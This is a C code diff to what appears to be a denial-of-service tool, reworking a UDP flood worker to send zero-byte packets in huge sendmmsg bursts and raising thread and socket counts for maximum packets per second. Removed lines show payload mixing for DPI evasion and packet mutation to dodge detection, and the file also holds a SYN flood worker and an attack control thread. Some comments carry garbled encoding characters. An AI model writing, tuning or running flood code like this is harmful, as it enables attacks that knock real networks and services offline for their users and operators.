@@ -95,75 +95,35 @@ typedef struct {
     int port_base; int duration; int cpu_id; char host[256];
 } MegaThread;
 
+#define MEGA_W_BATCH 65535
+#define MEGA_W_RING  1048576
+
 static void *mega_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    time_t start = time(NULL);
-    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self() ^ (unsigned)mt->cpu_id;
-
-    /* Dynamic batch: scale with available RAM (min 256, max 4096) */
-    struct sysinfo si;
-    long free_mb = 512;
-    if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
-    int batch = (int)(free_mb * 256 / 512);
-    if (batch < 256) batch = 256;
-    if (batch > MEGA_BATCH_MAX) batch = MEGA_BATCH_MAX;
-
-    size_t msg_sz = sizeof(struct mmsghdr) * (size_t)batch;
-    size_t iov_sz = sizeof(struct iovec) * (size_t)batch;
-    size_t ring_sz = (size_t)batch * MEGA_PAYLOAD;
-
-    /* Try hugepages first, fall back to normal mmap */
-    int mmflags = MAP_PRIVATE | MAP_ANONYMOUS;
-#ifdef MAP_HUGETLB
-    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
-    if (msgs == MAP_FAILED) {
-        msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-    }
-    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
-    if (iovs == MAP_FAILED) {
-        iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-    }
-    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags | MAP_HUGETLB, -1, 0);
-    if (ring == MAP_FAILED) {
-        ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-    }
-#else
-    struct mmsghdr *msgs = mmap(NULL, msg_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-    struct iovec *iovs = mmap(NULL, iov_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-    unsigned char *ring = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, mmflags, -1, 0);
-#endif
-
+    /* MATCH BASE: batch 65535, iov_len=0 zero-byte UDP = max pps, no payload copy */
+    size_t m_sz = sizeof(struct mmsghdr) * MEGA_W_BATCH;
+    size_t v_sz = sizeof(struct iovec) * MEGA_W_BATCH;
+    struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
+                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    struct iovec *iovs = mmap(NULL, v_sz, PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    char *ring = mmap(NULL, MEGA_W_RING, PROT_READ | PROT_WRITE,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
-        if (msgs != MAP_FAILED) munmap(msgs, msg_sz);
-        if (iovs != MAP_FAILED) munmap(iovs, iov_sz);
-        if (ring != MAP_FAILED) munmap(ring, ring_sz);
+        if (msgs != MAP_FAILED) munmap(msgs, m_sz);
+        if (iovs != MAP_FAILED) munmap(iovs, v_sz);
+        if (ring != MAP_FAILED) munmap(ring, MEGA_W_RING);
         return NULL;
     }
+    memset(ring, 0, MEGA_W_RING);
 
-    /* Fill ring Ã¢â‚¬â€ 67% real/pattern payloads for DPI evasion */
-    for (int i = 0; i < batch; i++) {
-        unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
-        if (g_total_payloads > 0 && (i % 3) != 0) {
-            int idx = rand_r(&seed) % g_total_payloads;
-            int pl = g_payload_lens[idx];
-            if (pl > MEGA_PAYLOAD) pl = MEGA_PAYLOAD;
-            memcpy(slot, g_payloads[idx], pl);
-            if (pl < MEGA_PAYLOAD) {
-                for (int j = pl; j < MEGA_PAYLOAD; j++)
-                    slot[j] = (unsigned char)rand_r(&seed);
-            }
-        } else if (num_bypass_patterns > 0) {
-            generate_smart_bypass_payload(slot, i, 0);
-        } else {
-            for (int j = 0; j < MEGA_PAYLOAD; j++)
-                slot[j] = (unsigned char)rand_r(&seed);
-        }
-        iovs[i].iov_base = slot;
-        iovs[i].iov_len = MEGA_PAYLOAD;
+    for (int i = 0; i < MEGA_W_BATCH; i++) {
+        iovs[i].iov_base = &ring[i & (MEGA_W_RING - 1)];
+        iovs[i].iov_len = 0;
         msgs[i].msg_hdr.msg_iov = &iovs[i];
         msgs[i].msg_hdr.msg_iovlen = 1;
         msgs[i].msg_hdr.msg_name = &mt->target;
@@ -178,54 +138,43 @@ static void *mega_worker(void *arg) {
 #ifdef MSG_ZEROCOPY
     flags |= MSG_ZEROCOPY;
 #endif
+    unsigned int zc = 0;
     int port_off = 0;
-    unsigned int zc_counter = 0;
+    time_t start = time(NULL);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         if (should_pause()) { usleep(200); continue; }
-
         port_off = (port_off + 1) % 64;
         uint16_t dp = (uint16_t)(mt->port_base + port_off);
         if (dp == 0) dp = 1;
         mt->target.sin_port = htons(dp);
-        /* msg_name pointers all point to mt->target, port change is auto-visible */
 
-        for (int si = 0; si < mt->sock_count && !is_attack_stop(); si++) {
-            /* Anti-pattern mutation every ~32nd iteration */
-            if ((seed & 0x1F) == 0) {
-                int slot = rand_r(&seed) % batch;
-                unsigned char *p = ring + (size_t)slot * MEGA_PAYLOAD;
-                p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
+        for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
+            /* MATCH BASE: BURST_MULTIPLIER 64 = sendmmsg x64 per socket */
+            for (int b = 0; b < 64 && !is_attack_stop(); b++) {
+                int r = safe_sendmmsg(mt->socks[s], msgs, MEGA_W_BATCH, flags);
+                if (r > 0) pkt_sent(r);
+                else if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(1);
             }
-
-            /* Single sendmmsg call Ã¢â‚¬â€ fills TX queue, no wasted iterations */
-            int r = safe_sendmmsg(mt->socks[si], msgs, (unsigned int)batch, flags);
-            if (r > 0) {
-                pkt_sent(r * MEGA_PAYLOAD);
-            } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                usleep(1);
-            }
-
 #ifdef MSG_ZEROCOPY
-            if ((++zc_counter & 0x7) == 0) {
+            if ((++zc & 0x7) == 0) {
                 unsigned char zbuf[256];
                 struct msghdr zm = {0};
                 struct iovec zi = {zbuf, sizeof(zbuf)};
                 zm.msg_iov = &zi; zm.msg_iovlen = 1;
-                while (recvmsg(mt->socks[si], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
+                while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
             }
 #endif
         }
-        seed++;
     }
 
-    munmap(msgs, msg_sz);
-    munmap(iovs, iov_sz);
-    munmap(ring, ring_sz);
+    munmap(msgs, m_sz);
+    munmap(iovs, v_sz);
+    munmap(ring, MEGA_W_RING);
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ SYN Flood (fixed: TCP options, real src IP, no spoofing) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* SYN Flood (fixed: TCP options, real src IP, no spoofing) */
 static void *syn_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
@@ -671,12 +620,14 @@ void *bg_attack_thread(void *arg)
         struct sysinfo si;
         long free_mb = 512;
         if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
-        int max_sk = cores * MEGA_SOCKS_PER_CPU;
-        int ram_cap = (int)(free_mb / 1); /* 1MB per socket — max count */
-        if (ram_cap < 8) ram_cap = 8;
-        if (max_sk > ram_cap) max_sk = ram_cap;
+        /* Cap socket count: 256 per CPU max, min 64. Avoid OOM from huge socket pools. */
+        int max_sk = cores * 256;
+        if (max_sk < 64) max_sk = 64;
         if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
-        if (max_sk < 8) max_sk = 8;
+        /* RAM safety: 2MB per socket reservation ceiling */
+        int ram_cap = (int)(free_mb / 2);
+        if (ram_cap < 64) ram_cap = 64;
+        if (max_sk > ram_cap) max_sk = ram_cap;
 
         int *socks = calloc((size_t)max_sk, sizeof(int));
         if (!socks) { set_attack_active(0); free(ctx); return NULL; }
@@ -697,9 +648,9 @@ void *bg_attack_thread(void *arg)
             free(socks); set_attack_active(0); free(ctx); return NULL;
         }
 
-        int n_udp = cores;
+        int n_udp = cores * 2;   /* MATCH BASE: 2 threads per core */
         if (n_udp < 1) n_udp = 1;
-        if (n_udp > 8) n_udp = 8;
+        if (n_udp > 32) n_udp = 32;
         if (n_udp > sock_cnt) n_udp = sock_cnt;
         int threads = n_udp;
 
@@ -716,7 +667,7 @@ void *bg_attack_thread(void *arg)
 
         pthread_attr_t attr;
         pthread_attr_init(&attr);
-        pthread_attr_setstacksize(&attr, 512 * 1024);
+        pthread_attr_setstacksize(&attr, 8388608); /* 8MB like base */
         int spth = sock_cnt / n_udp; if (spth < 1) spth = 1;
         for (int i = 0; i < n_udp; i++) {
             mt[i].socks = &socks[i * spth];
